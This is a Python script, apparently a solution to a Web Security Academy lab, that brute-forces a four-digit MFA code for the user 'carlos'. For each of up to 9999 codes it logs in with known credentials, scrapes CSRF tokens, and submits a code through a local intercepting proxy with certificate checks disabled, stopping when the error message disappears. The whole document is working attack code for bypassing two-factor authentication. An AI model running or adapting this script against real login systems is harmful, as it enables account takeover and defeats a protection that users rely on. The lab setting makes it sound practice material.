import requests 
import urllib3 
import re

# Suppress the warning about unverified HTTPS requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Proxy configuration (usually for tools like Burp Suite, Fiddler, etc.)
proxies={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

url = "https://0a55005d034ff2d08236bb9500470044.web-security-academy.net/"


for i in range(0000, 9999):
    print(f"Trring for mfa {i:04d}") 
    mfa_code = f"{i:04d}"
    carlos_session = requests.Session()
    csrf = carlos_session.get(url+"login",proxies=proxies,verify=False)
    match = re.search(r'name="csrf"\s+value="([a-zA-Z0-9]+)"', csrf.text)
    csrf_token = match.group(1)
    data = {"username":"carlos","password":"montoya","csrf":csrf_token}
    response = carlos_session.post(url+"login",data=data,proxies=proxies,verify=False,allow_redirects=False)


  #// if use 0000 then it will print like So 0 prints as 0, not 000
    csrf2 = carlos_session.get(url+"login2",proxies=proxies,verify=False)
    match = re.search(r'name="csrf"\s+value="([a-zA-Z0-9]+)"', csrf2.text)
    csrf_token_2 = match.group(1)
    data1 = {"mfa-code":mfa_code,"csrf":csrf_token_2}
    carlos_response = carlos_session.post(url + "login2",proxies=proxies,verify=False, data=data1)
    if "Incorrect security code" not in carlos_response.text:
        print("CODE found for carlos", mfa_code)
        break







    # dout after login , csrf will generate token thats create problem for me 
     